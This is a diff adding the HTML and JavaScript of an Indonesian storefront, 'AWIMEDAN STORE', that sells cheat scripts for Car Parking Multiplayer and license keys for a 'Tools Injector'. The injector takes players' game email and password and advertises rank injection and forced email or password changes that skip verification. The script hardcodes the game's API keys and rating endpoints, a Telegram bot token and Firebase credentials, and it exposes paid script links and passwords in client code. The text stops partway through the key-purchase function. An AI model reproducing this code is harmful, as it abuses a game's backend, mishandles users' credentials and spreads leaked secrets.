@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AWIMEDAN STORE - Premium Car Parking Multiplayer</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
+        
+        * { font-family: 'Plus Jakarta Sans', sans-serif; transition: all 0.2s ease-in-out; }
+        
+        body { 
+            background: #0a0a0a; 
+            color: #ffffff; 
+            overflow-x: hidden;
+            background-image: linear-gradient(to bottom, rgba(10,10,10,0.8), #0a0a0a), url('https://w0.peakpx.com/wallpaper/424/62/HD-wallpaper-r34-nissan-skyline-gtr-bayside-blue-jdm.jpg');
+            background-attachment: fixed;
+            background-size: cover;
+        }
+
+        .glass-nav { background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(15px); border-bottom: 1px solid rgba(255, 255, 255, 0.1); }
+        .hero-title { font-weight: 800; letter-spacing: -0.05em; line-height: 0.9; }
+        .accent-red { color: #ff3131; }
+        .bg-accent-red { background: #ff3131; }
+        
+        .stat-card {
+            background: rgba(20, 20, 20, 0.6);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+        }
+
+        .btn-primary {
+            background: #ff3131;
+            box-shadow: 0 4px 15px rgba(255, 49, 49, 0.3);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .sidebar-glass { background: rgba(10, 10, 10, 0.98); backdrop-filter: blur(20px); z-index: 1000; border-left: 1px solid rgba(255, 49, 49, 0.2); }
+        
+        [x-cloak] { display: none !important; }
+
+        .banner-container {
+            position: relative;
+            width: 100%;
+            padding-top: 56.25%; 
+            overflow: hidden;
+            border-radius: 8px;
+            background: #111;
+        }
+
+        .banner-container img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body x-data="app()" x-init="init()">
+
+    <nav class="fixed top-0 left-0 right-0 h-20 glass-nav z-[100] flex items-center">
+        <div class="container mx-auto px-4 flex justify-between items-center">
+            <div class="flex items-center space-x-2 cursor-pointer" @click="currentPage = 'home'">
+                <img src="images/logo.jpg" class="w-10 h-10 rounded-full border border-red-600" alt="AWIMEDAN">
+                <span class="text-2xl font-black italic tracking-tighter">AWIMEDAN<span class="accent-red"></span></span>
+            </div>
+
+            <div class="hidden md:flex space-x-8 text-sm font-bold uppercase tracking-widest">
+                <span @click="currentPage = 'home'" :class="currentPage === 'home' ? 'accent-red' : 'text-gray-400'" class="cursor-pointer hover:text-white">Store</span>
+                <span @click="currentPage = 'tools'" :class="currentPage === 'tools' ? 'accent-red' : 'text-gray-400'" class="cursor-pointer hover:text-white">Tools</span>
+                <span @click="currentPage = 'buykey'" :class="currentPage === 'buykey' ? 'accent-red' : 'text-gray-400'" class="cursor-pointer hover:text-white">BUY KEY</span>
+                <span @click="currentPage = 'topup'" :class="currentPage === 'topup' ? 'accent-red' : 'text-gray-400'" class="cursor-pointer hover:text-white">Top Up</span>
+            </div>
+
+            <div class="flex items-center space-x-3">
+                <template x-if="!user">
+                    <button @click="loginGoogle()" class="bg-accent-red px-5 py-2 rounded-md font-bold text-xs flex items-center">
+                        <i class="fas fa-user mr-2"></i> LOGIN
+                    </button>
+                </template>
+                <template x-if="user">
+                    <div @click="sideBar = true" class="flex items-center bg-white/5 px-3 py-1.5 rounded-lg border border-white/10 cursor-pointer">
+                        <img :src="user.photoURL" class="w-7 h-7 rounded-full mr-2 border border-red-500">
+                        <span class="text-xs font-bold" x-text="'Rp ' + (userData.balance || 0).toLocaleString()"></span>
+                    </div>
+                </template>
+                <button @click="sideBar = true" class="text-xl px-2"><i class="fas fa-bars"></i></button>
+            </div>
+        </div>
+    </nav>
+
+    <div x-show="sideBar" class="fixed inset-0 z-[1000]" x-cloak>
+        <div @click="sideBar = false" class="absolute inset-0 bg-black/90"></div>
+        <div class="absolute right-0 top-0 h-full w-80 sidebar-glass p-8" 
+             x-transition:enter="transition ease-out duration-300" x-transition:enter-start="translate-x-full" x-transition:enter-end="translate-x-0">
+            <div class="flex justify-between items-center mb-10">
+                <h2 class="font-black italic text-xl accent-red tracking-tighter">ACCOUNT PANEL</h2>
+                <i @click="sideBar = false" class="fas fa-times text-2xl cursor-pointer"></i>
+            </div>
+            
+            <template x-if="user">
+                <div class="space-y-6">
+                    <div class="flex items-center space-x-4 p-4 bg-white/5 rounded-xl">
+                        <img :src="user.photoURL" class="w-12 h-12 rounded-full border-2 border-red-600">
+                        <div class="overflow-hidden">
+                            <p class="font-bold truncate" x-text="user.displayName"></p>
+                            <p class="text-[10px] text-gray-500 truncate uppercase" x-text="user.email"></p>
+                        </div>
+                    </div>
+
+                    <div class="p-6 bg-accent-red rounded-xl text-center shadow-lg shadow-red-600/20">
+                        <p class="text-[10px] uppercase font-bold text-white/70 mb-1">Total Saldo</p>
+                        <p class="text-2xl font-black" x-text="'Rp ' + (userData.balance || 0).toLocaleString()"></p>
+                    </div>
+
+                    <div class="grid grid-cols-1 gap-2">
+                        <button @click="currentPage = 'topup'; sideBar = false" class="w-full text-left p-4 hover:bg-white/5 rounded-lg flex items-center font-bold text-sm">
+                            <i class="fas fa-wallet w-8 accent-red"></i> Top Up Saldo
+                        </button>
+                        <button @click="currentPage = 'history'; sideBar = false" class="w-full text-left p-4 hover:bg-white/5 rounded-lg flex items-center font-bold text-sm">
+                            <i class="fas fa-history w-8 accent-red"></i> Riwayat
+                        </button>
+                        <template x-if="isAdmin">
+                            <button @click="currentPage = 'admin'; sideBar = false" class="w-full text-left p-4 text-yellow-500 hover:bg-white/5 rounded-lg flex items-center font-bold text-sm">
+                                <i class="fas fa-user-shield w-8"></i> ADMIN PANEL
+                            </button>
+                        </template>
+                        <div class="pt-4 mt-4 border-t border-white/5">
+                            <button @click="logoutGoogle()" class="w-full text-left p-4 text-red-500 hover:bg-red-500/10 rounded-lg flex items-center font-bold text-sm">
+                                <i class="fas fa-sign-out-alt w-8"></i> Logout
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </template>
+        </div>
+    </div>
+
+    <main class="pt-24 pb-20">
+        
+        <div x-show="currentPage === 'home'" x-transition class="container mx-auto px-4">
+            <div class="text-center py-12 mb-12">
+                <div class="inline-block bg-red-600/20 text-red-500 px-4 py-1 rounded-full text-[10px] font-bold uppercase tracking-widest mb-4">
+                    ⚡ Car Parking Multiplayer Tools
+                </div>
+                <h1 class="hero-title text-6xl md:text-8xl italic uppercase mb-4">AWIMEDAN <span class="accent-red">STORE</span></h1>
+                <p class="text-gray-400 max-w-2xl mx-auto text-sm md:text-base leading-relaxed">
+                    Platform modifikasi akun Car Parking Multiplayer #1 di Indonesia.<br>
+                    Proses otomatis, server stabil, dan terpercaya.
+                </p>
+                
+                <div class="flex flex-wrap justify-center gap-4 mt-10">
+                    <button @click="document.getElementById('catalog').scrollIntoView({behavior:'smooth'})" class="btn-primary px-10 py-4 rounded-lg font-black italic flex items-center">
+                        <i class="fas fa-shopping-cart mr-2"></i> LIHAT TOKO
+                    </button>
+                    <button @click="currentPage = 'topup'" class="btn-secondary px-10 py-4 rounded-lg font-black italic">
+                        TOP UP SALDO
+                    </button>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-4xl mx-auto mt-20">
+                    <div class="stat-card p-8">
+                        <i class="fas fa-users text-2xl accent-red mb-4"></i>
+                        <h3 class="text-3xl font-black">1.016</h3>
+                        <p class="text-xs text-gray-500 uppercase font-bold tracking-widest mt-1">Total Members</p>
+                    </div>
+                    <div class="stat-card p-8">
+                        <i class="fas fa-bolt text-2xl accent-red mb-4"></i>
+                        <h3 class="text-3xl font-black">467</h3>
+                        <p class="text-xs text-gray-500 uppercase font-bold tracking-widest mt-1">Total Eksekusi</p>
+                    </div>
+                    <div class="stat-card p-8">
+                        <i class="far fa-clock text-2xl accent-red mb-4"></i>
+                        <h3 class="text-3xl font-black">24/7</h3>
+                        <p class="text-xs text-gray-500 uppercase font-bold tracking-widest mt-1">Server Online</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="catalog" class="py-12">
+                <h2 class="text-2xl font-black italic uppercase mb-10 border-l-4 border-red-600 pl-4">Katalog <span class="accent-red">Premium</span></h2>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-10">
+                    <template x-for="p in products" :key="p.name">
+                        <div class="stat-card p-4 md:p-6 flex flex-col hover:border-red-600 group transition-all duration-300">
+                            <div class="banner-container mb-5">
+                                <img :src="p.img" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500">
+                                <div class="absolute top-3 right-3 bg-red-600 px-3 py-1 rounded text-[10px] font-black italic shadow-lg">SALE</div>
+                            </div>
+                            
+                            <h3 class="font-bold text-lg mb-2 truncate text-gray-100" x-text="p.name"></h3>
+                            <div class="flex items-center justify-between mt-auto pt-4 border-t border-white/5">
+                                <p class="accent-red font-black text-2xl tracking-tighter" x-text="'Rp ' + p.price.toLocaleString()"></p>
+                                <button @click="beliProduk(p.name)" class="bg-white text-black px-6 py-3 rounded-lg font-black text-[11px] uppercase tracking-tighter hover:bg-red-600 hover:text-white shadow-xl active:scale-95">
+                                    Beli Sekarang
+                                </button>
+                            </div>
+                        </div>
+                    </template>
+                </div>
+            </div>
+        </div>
+
+        <div x-show="currentPage === 'tools'" x-transition class="container mx-auto px-4 max-w-xl">
+            <div x-show="!cpmUser.isLoggedIn" class="stat-card p-10 border-red-600/20">
+                <div class="text-center mb-8">
+                    <i class="fas fa-shield-alt text-4xl accent-red mb-4"></i>
+                    <h2 class="text-2xl font-black italic">TOOLS INJECTOR</h2>
+                    <p class="text-[10px] text-gray-500 uppercase font-bold">Masukkan Kredensial Akun Game Anda</p>
+                </div>
+                
+                <div class="space-y-4">
+                    <select x-model="cpmForm.gameId" class="w-full bg-black border border-white/10 p-4 rounded-lg text-sm font-bold">
+                        <option value="">Pilih Versi Game</option>
+                        <option value="1">CPM 1 (Original)</option>
+                        <option value="2">CPM 2 (New)</option>
+                    </select>
+                    <input type="email" x-model="cpmForm.email" placeholder="Email Akun Game" class="w-full bg-black border border-white/10 p-4 rounded-lg outline-none text-sm">
+                    <input type="password" x-model="cpmForm.password" placeholder="Password Game" class="w-full bg-black border border-white/10 p-4 rounded-lg outline-none text-sm">
+                    <input type="text" x-model="cpmForm.key" placeholder="Premium License Key" class="w-full bg-black border border-red-600/30 p-4 rounded-lg outline-none text-sm font-mono text-red-500">
+                    
+                    <button @click="handleCpmLogin" :disabled="loading" class="w-full btn-primary py-4 rounded-xl font-black italic tracking-widest">
+                        <span x-show="!loading">VERIFIKASI & LOGIN</span>
+                        <i x-show="loading" class="fas fa-circle-notch animate-spin"></i>
+                    </button>
+                    <p class="text-red-500 text-xs text-center font-bold" x-text="message"></p>
+                </div>
+            </div>
+
+            <div x-show="cpmUser.isLoggedIn" class="space-y-4" x-cloak>
+                <div class="stat-card p-4 flex justify-between items-center border-l-4 border-green-500">
+                    <div>
+                        <p class="text-[10px] text-gray-500 uppercase font-bold">Connected Account</p>
+                        <p class="font-bold text-sm" x-text="cpmUser.email"></p>
+                    </div>
+                    <button @click="logoutCpm" class="bg-red-600/10 text-red-500 px-4 py-2 rounded font-black text-[10px]">LOGOUT</button>
+                </div>
+                
+                <div class="grid grid-cols-1 gap-3">
+                    <button @click="setKingRank" class="stat-card p-6 flex items-center hover:bg-red-600/10 text-left">
+                        <i class="fas fa-crown text-3xl text-yellow-500 mr-6"></i>
+                        <div><h4 class="font-black italic text-sm">INJECT KING RANK</h4><p class="text-[10px] text-gray-500">Inject 1B Rating + Status King Permanent</p></div>
+                    </button>
+                    <button @click="changeEmailPrompt" class="stat-card p-6 flex items-center hover:bg-red-600/10 text-left">
+                        <i class="fas fa-envelope text-3xl accent-red mr-6"></i>
+                        <div><h4 class="font-black italic text-sm">FORCE CHANGE EMAIL</h4><p class="text-[10px] text-gray-500">Ganti email akun tanpa kode verifikasi</p></div>
+                    </button>
+                    <button @click="changePasswordPrompt" class="stat-card p-6 flex items-center hover:bg-red-600/10 text-left">
+                        <i class="fas fa-key text-3xl accent-red mr-6"></i>
+                        <div><h4 class="font-black italic text-sm">INSTANT CHANGE PASS</h4><p class="text-[10px] text-gray-500">Ubah password akun secara instan</p></div>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div x-show="currentPage === 'buykey'" x-transition class="container mx-auto px-4">
+            <div class="text-center py-10">
+                <h2 class="text-4xl font-black italic uppercase mb-2 tracking-tighter">BUY <span class="accent-red">PREMIUM KEY</span></h2>
+                <p class="text-gray-500 text-[10px] font-bold uppercase tracking-widest">Pilih lisensi untuk mendapatkan akses penuh ke Tools Injector</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-5xl mx-auto mt-6">
+                <div class="stat-card p-8 border-t-4 border-white/10 hover:border-red-600 transition-all flex flex-col items-center text-center">
+                    <i class="fas fa-bolt text-4xl mb-4 text-gray-400"></i>
+                    <h3 class="text-xl font-black italic uppercase">VIP 7 DAY KEY</h3>
+                    <p class="text-[9px] text-gray-500 font-bold mb-6 uppercase tracking-widest">AKSES FULL FITUR - 1 MINGGU</p>
+                    <div class="text-3xl font-black mb-8 accent-red tracking-tighter">Rp 25.000</div>
+                    <button @click="beliKey('VIP 7 DAY', 25000)" class="w-full btn-primary py-3 rounded-lg font-black italic text-xs uppercase tracking-widest">Beli Sekarang</button>
+                </div>
+
+                <div class="stat-card p-8 border-t-4 border-red-600 relative overflow-hidden flex flex-col items-center text-center scale-105 shadow-2xl shadow-red-600/10">
+                    <div class="absolute top-4 right-[-35px] bg-red-600 text-[8px] font-black py-1 px-10 rotate-45 tracking-tighter">HOT ITEM</div>
+                    <i class="fas fa-crown text-4xl mb-4 text-yellow-500"></i>
+                    <h3 class="text-xl font-black italic uppercase">VIP 1 MONTH KEY</h3>
+                    <p class="text-[9px] text-gray-500 font-bold mb-6 uppercase tracking-widest">AKSES FULL FITUR - 30 HARI</p>
+                    <div class="text-3xl font-black mb-8 accent-red tracking-tighter">Rp 75.000</div>
+                    <button @click="beliKey('VIP 1 MONTH', 75000)" class="w-full btn-primary py-3 rounded-lg font-black italic text-xs uppercase tracking-widest">Beli Sekarang</button>
+                </div>
+
+                <div class="stat-card p-8 border-t-4 border-white/10 hover:border-red-600 transition-all flex flex-col items-center text-center">
+                    <i class="fas fa-infinity text-4xl mb-4 text-blue-500"></i>
+                    <h3 class="text-xl font-black italic uppercase">UNLIMITED</h3>
+                    <p class="text-[9px] text-gray-500 font-bold mb-6 uppercase tracking-widest">AKSES PERMANEN SEUMUR HIDUP</p>
+                    <div class="text-3xl font-black mb-8 accent-red tracking-tighter">Rp 200.000</div>
+                    <button @click="beliKey('UNLIMITED ACCESS', 200000)" class="w-full btn-primary py-3 rounded-lg font-black italic text-xs uppercase tracking-widest">Beli Sekarang</button>
+                </div>
+            </div>
+        </div>
+
+        <div x-show="currentPage === 'topup'" x-transition class="container mx-auto px-4 max-md">
+            <div class="stat-card p-8 text-center">
+                <h2 class="text-2xl font-black italic accent-red mb-2">TOP UP SALDO</h2>
+                <p class="text-[10px] text-gray-500 font-bold uppercase mb-8">Pilih nominal dan scan QRIS</p>
+                
+                <div class="grid grid-cols-2 gap-2 mb-8">
+                    <template x-for="amt in [20000, 50000, 100000, 150000]">
+                        <button @click="selectedAmount = amt" 
+                                :class="selectedAmount === amt ? 'bg-red-600 text-white' : 'bg-white/5 text-gray-400'"
+                                class="p-4 rounded-lg font-bold text-sm">
+                            Rp <span x-text="amt.toLocaleString()"></span>
+                        </button>
+                    </template>
+                </div>
+
+                <div x-show="selectedAmount > 0" x-transition class="bg-white p-4 rounded-xl mb-6">
+                    <img src="qris.jpg" class="w-full">
+                    <p class="text-black font-black mt-2 italic text-lg" x-text="'TOTAL: Rp ' + selectedAmount.toLocaleString()"></p>
+                </div>
+
+                <div x-show="selectedAmount > 0" class="space-y-4">
+                    <input type="file" @change="handleFileUpload" class="text-xs text-gray-500 w-full mb-4">
+                    <button @click="sendToWhatsApp" class="w-full bg-green-600 py-4 rounded-xl font-black flex items-center justify-center">
+                        <i class="fab fa-whatsapp mr-2 text-xl"></i> KONFIRMASI ADMIN
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div x-show="currentPage === 'history'" x-transition class="container mx-auto px-4 max-w-2xl">
+            <div class="stat-card p-6">
+                <div class="flex justify-between items-center mb-6">
+                    <h2 class="text-xl font-black italic accent-red">RIWAYAT TRANSAKSI</h2>
+                    <button @click="currentPage = 'home'" class="text-[10px] font-bold text-gray-500 hover:text-white uppercase">
+                        <i class="fas fa-arrow-left mr-1"></i> Kembali
+                    </button>
+                </div>
+
+                <div class="space-y-3">
+                    <template x-for="h in userHistory" :key="h.date">
+                        <div class="bg-white/5 border border-white/5 p-4 rounded-xl flex justify-between items-center hover:border-red-600/30 transition-colors">
+                            <div class="overflow-hidden">
+                                <p class="font-bold text-sm truncate" x-text="h.productName"></p>
+                                <p class="text-[9px] text-gray-500 font-bold uppercase tracking-tighter" x-text="new Date(h.date).toLocaleString('id-ID')"></p>
+                            </div>
+                            <div class="text-right ml-4">
+                                <p class="accent-red font-black text-sm" x-text="'- Rp ' + h.price.toLocaleString()"></p>
+                                <span class="text-[8px] bg-green-500/20 text-green-500 px-2 py-0.5 rounded font-black italic">SUCCESS</span>
+                            </div>
+                        </div>
+                    </template>
+
+                    <template x-if="userHistory.length === 0">
+                        <div class="text-center py-12">
+                            <i class="fas fa-history text-4xl text-gray-800 mb-4"></i>
+                            <p class="text-gray-500 text-xs font-bold uppercase tracking-widest">Belum ada transaksi</p>
+                        </div>
+                    </template>
+                </div>
+            </div>
+        </div>
+
+        <template x-if="isAdmin">
+            <div x-show="currentPage === 'admin'" x-transition class="container mx-auto px-4">
+                <div class="stat-card p-6 overflow-x-auto">
+                    <h2 class="text-xl font-black italic mb-6 accent-red">ADMIN CONTROL</h2>
+                    <table class="w-full text-left text-xs uppercase font-bold">
+                        <thead class="text-gray-500 border-b border-white/5">
+                            <tr>
+                                <th class="p-4">User</th>
+                                <th class="p-4">Saldo</th>
+                                <th class="p-4">Aksi</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-white/5">
+                            <template x-for="u in allUsers" :key="u.id">
+                                <tr class="hover:bg-white/5">
+                                    <td class="p-4" x-text="u.email"></td>
+                                    <td class="p-4 accent-red font-black" x-text="'Rp ' + (u.balance || 0).toLocaleString()"></td>
+                                    <td class="p-4 flex gap-2">
+                                        <button @click="updateBalance(u.id, 10000)" class="bg-green-600/20 text-green-500 px-2 py-1 rounded">+10K</button>
+                                        <button @click="resetBalance(u.id)" class="bg-red-600/20 text-red-500 px-2 py-1 rounded">RESET</button>
+                                    </td>
+                                </tr>
+                            </template>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </template>
+
+    </main>
+
+    <script>
+        function app() {
+            return {
+                currentPage: 'home', sideBar: false, loading: false, message: '', user: null, userData: { balance: 0 },
+                cpmUser: { isLoggedIn: false, email: '', token: '', gameData: null },
+                cpmForm: { gameId: '', email: '', password: '', key: '' },
+                userHistory: [],
+                selectedAmount: 0,
+                selectedFile: null,
+                adminEmail: "kulgarfreefire2022@gmail.com", 
+                isAdmin: false,
+                allUsers: [],
+
+                firebaseConfig: {
+                    apiKey: "AIzaSyCNZokAKl6TVKWMOc51SCSRKZGqoG77uFI",
+                    authDomain: "cpmapikey.firebaseapp.com",
+                    databaseURL: "https://cpmapikey-default-rtdb.asia-southeast1.firebasedatabase.app",
+                    projectId: "cpmapikey",
+                    storageBucket: "cpmapikey.firebasestorage.app",
+                    messagingSenderId: "372965414639",
+                    appId: "1:372965414639:web:e79bb42a252336cab52d1a"
+                },
+                botToken: "8625213432:AAHVdpxEdFkh1vg1SF5RQha09wp6SxRlGdU",
+                adminChatId: "6095762919",
+
+                products: [
+                    { name: 'Script All In One CPM 1', price: 100000, img: 'images/Script All In One AWIMEDAN CPM 1.jpg', link: 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/SCRIPT%20ALL%20IN%20ONE%20AWIMEDAN%20CPM%201.lua', pass: 'USERVVIP2026' },
+                    { name: 'Script Wallhack', price: 20000, img: 'images/Script Wallhack.jpg', link: 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/Wallhack.lua', pass: 'USERVIP052' },
+                    { name: 'Script Race 3 Second', price: 25000, img: 'images/Script Race 3sec.jpg', link: 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/Wallhack.lua', pass: 'USERVIP05472' },
+                    { name: 'Script Timing Kuda Permanent + Tutorial', price: 30000, img: 'images/Script Timing Kuda Permanent.jpg', link: 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/Timing%20kuda%20Permanent.lua', pass: 'VipScript30k' },
+                    { name: 'Script Timing Kuda Permanent', price: 15000, img: 'images/Script Timing Kuda Permanent.jpg', link: 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/Timing%20kuda%20Permanent.lua', pass: 'VipScript30k' },
+                    { name: 'Script 8000 / 8K Tune Up', price: 30000, img: 'images/Script 8000 Tune Up.jpg', link: 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/SPEC%208000%20BY%20AWIMEDAN.lua', pass: 'AWIMEDAN100SUBS' },
+                    { name: 'Script Unlimited Tires 100% & 0%', price: 20000, img: 'images/Script Unlimited Tires.jpg', link: 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/SCRIPT%20TIRES%20100%25%20%26%20TIRES%200%20%25.lua', pass: 'AWIMEDANCHANNEL' },
+                    { name: 'Script Timing Kuda Tune Up', price: 20000, img: 'images/Timing Kuda Tune Up.jpg', link: 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/TIMING%20KUDA%20TUNE%20UP.lua', pass: 'AWIMEDAN100DUBS' },
+                    { name: 'Script Velg Bakar & Chrome', price: 20000, img: 'images/Script Velg Bakar & Chrome.jpg', link: 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/VELG%20BAKAR%20%26%20CHROME.lua', pass: 'AWIMEDAN100SUBS ' },
+                    { name: 'Script Unlock Premium Features', price: 20000, img: 'images/Unlock Premium Features.jpg', link: 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/UNLOCK%20PREMIUM.lua', pass: 'AWIMEDAN300SUBS' },
+                    { name: 'Script Camper & Ufo', price: 20000, img: 'images/Script Camper & Ufo.jpg', link : 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/Camper%20%26%20UFO.lua', pass: 'AWIMEDAN100SUBS' },
+                    { name: 'Script Timing Kuda Slember', price: 25000, img: 'images/Timing Kuda Slember.jpg', link: 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/SLEMBER%20BLAYER%20BRATATAK.lua', pass: 'AWIMEDAN100SUBS' },
+                    { name: 'Script Long Name', price: 15000, img: 'images/Script Long Name.jpg', link: 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/Long%20Name.lua', pass: 'USERVIP806' },
+                    { name: 'CAR F1 & F2 1027+Kmh', price: 15000, img: 'images/F1 & F2 Tune Up Permanent .jpg', link: 'https://raw.githubusercontent.com/indiansearnroof-eng/scrfile/main/UserVip_F1%20FFA.lua', pass: 'USERVIP796' },
+                ],
+
+                gameApis: {
+                    "1": { name: "CPM 1", api: "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", rankUrl: "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
+                    "2": { name: "CPM 2", api: "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", rankUrl: "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
+                },
+
+                init() {
+                    if (!firebase.apps.length) firebase.initializeApp(this.firebaseConfig);
+                    firebase.auth().onAuthStateChanged((u) => {
+                        this.user = u;
+                        if (u) {
+                            this.fetchUserData(u.uid);
+                            this.fetchUserHistory(u.uid);
+                            if (u.email === this.adminEmail) {
+                                this.isAdmin = true;
+                                this.fetchAllUsers();
+                            }
+                        }
+                    });
+                },
+
+                async loginGoogle() {
+                    const provider = new firebase.auth.GoogleAuthProvider();
+                    try { await firebase.auth().signInWithPopup(provider); } catch (e) { alert(e.message); }
+                },
+
+                async logoutGoogle() { await firebase.auth().signOut(); location.reload(); },
+
+                fetchUserData(uid) {
+                    firebase.database().ref('users/' + uid).on('value', (snap) => {
+                        if (snap.val()) this.userData = snap.val();
+                        else firebase.database().ref('users/' + uid).set({ email: this.user.email, balance: 0, createdAt: Date.now() });
+                    });
+                },
+
+                fetchUserHistory(uid) {
+                    firebase.database().ref('history/' + uid).on('value', (snap) => {
+                        const data = snap.val();
+                        this.userHistory = data ? Object.values(data).reverse() : [];
+                    });
+                },
+
+                fetchAllUsers() {
+                    firebase.database().ref('users').on('value', (snap) => {
+                        const data = snap.val();
+                        this.allUsers = data ? Object.keys(data).map(k => ({ id: k, ...data[k] })) : [];
+                    });
+                },
+
+                handleFileUpload(event) { this.selectedFile = event.target.files[0]; },
+
+                sendToWhatsApp() {
+                    if (!this.selectedFile) return alert("Pilih bukti transfer!");
+                    const msg = `Konfirmasi Top Up\nEmail: ${this.user.email}\nNominal: Rp ${this.selectedAmount.toLocaleString()}`;
+                    window.open(`https://wa.me/6281330750863?text=${encodeURIComponent(msg)}`, '_blank');
+                },
+
+                async beliProduk(productName) {
+                    if (!this.user) return alert("Silakan Login terlebih dahulu!");
+                    
+                    const product = this.products.find(p => p.name === productName);
+                    const currentBalance = this.userData.balance || 0;
+
+                    if (currentBalance < product.price) {
+                        return alert("❌ Transaksi Gagal! Saldo Anda tidak cukup untuk membeli " + productName + ".");
+                    }
+
+                    if (confirm(`Konfirmasi pembelian ${productName} seharga Rp ${product.price.toLocaleString()}?`)) {
+                        this.loading = true;
+                        try {
+                            await firebase.database().ref('users/' + this.user.uid + '/balance').transaction(b => b - product.price);
+                            await firebase.database().ref('history/' + this.user.uid).push().set({ 
+                                productName, 
+                                price: product.price, 
+                                date: Date.now() 
+                            });
+
+                            this.logToTelegram(`🛒 **TRANSAKSI SUKSES**\nUser: ${this.user.email}\nProduk: ${productName}\nSisa Saldo: Rp ${(currentBalance - product.price).toLocaleString()}`);
+                            
+                            try {
+                                const response = await fetch(product.link);
+                                const blob = await response.blob();
+                                const url = window.URL.createObjectURL(blob);
+                                const a = document.createElement('a');
+                                a.style.display = 'none';
+                                a.href = url;
+                                a.download = productName + ".lua"; 
+                                document.body.appendChild(a);
+                                a.click();
+                                window.URL.revokeObjectURL(url);
+                                document.body.removeChild(a);
+                            } catch (err) {
+                                console.error("Auto-download error");
+                            }
+
+                            alert(
+                                "✅ PEMBELIAN BERHASIL!\n\n" +
+                                "File script sedang diunduh secara otomatis.\n" +
+                                "Password: " + product.pass + "\n\n" +
+                                "Mohon Untuk Di Screenshoot Agar Pasword Tidak Lupa"
+                            );
+
+                        } catch (e) { 
+                            alert("Terjadi kesalahan: " + e.message); 
+                        }
+                        this.loading = false;
+                    }
+                },
+
+                // LOGIKA AUTO GENERATE KEY KE FIREBASE DATABASE
+                async beliKey(keyName, price) {
+                    if (!this.user) return alert("Silakan Login terlebih dahulu!");
+                    
+                    const currentBalance = this.userData.balance || 0;
+                    if (currentBalance < price) {
+                        return alert("❌ Saldo tidak cukup!");
+                    }
+
+                    if (confirm(`Beli Lisensi ${keyName} seharga Rp ${price.toLocaleString()}?`)) {
+                        this.loading = true;
+                        try {
+                            // 1. Potong Saldo via Transaction (Aman)
+                            await firebase.database().ref('users/' + this.user.uid + '/balance').transaction(b => b - price);
+
+                            // 2. Generate Serial Key Acak
+                            const randomPart = () => Math.random().toString(36).substring(2, 6).toUpperCase();
+                            const generatedKey = `AW-${randomPart()}-${randomPart()}`;
+
+                            // 3. Tentukan Durasi Expired
+                            let durationDays = 0;
+                            if (keyName.includes('7 DAY')) durationDays = 7;
+                            else if (keyName.includes('1 MONTH')) durationDays = 30;
+                            else if (keyName.includes('UNLIMITED')) durationDays = 3650; // 10 Tahun
+
+                            const now = Date.now();
+                            const expiredAt = now + (durationDays * 24 * 60 * 60 * 1000);
+
+                            // 4. Simpan ke Path: keys/GENERATED_KEY
+                            await firebase.database().ref('keys/' + generatedKey).set({
+                                status: 'active',
+                                type: keyName,
+                                owner: this.user.email,
+                                uid: this.user.uid,
+                                createdAt: now,
+                                expiredAt: expiredAt,
+                                formattedExpiry: new Date(expiredAt).toLocaleString('id-ID')
+                            });
+
+                            // 5. Catat di Riwayat User
+                            await firebase.database().ref('history/' + this.user.uid).push().set({ 
+                                productName: "BUY KEY: " + keyName, 
+                                price: price, 
+                                date: now,
+                                details: "Generated Key: " + generatedKey
+                            });
+
+                            // 6. Log ke Telegram Admin
+                            this.logToTelegram(`🔑 **AUTO GENERATE KEY**\nUser: ${this.user.email}\nKey: \`${generatedKey}\`\nTipe: ${keyName}\nExpired: ${new Date(expiredAt).toLocaleString('id-ID')}`);
+                            
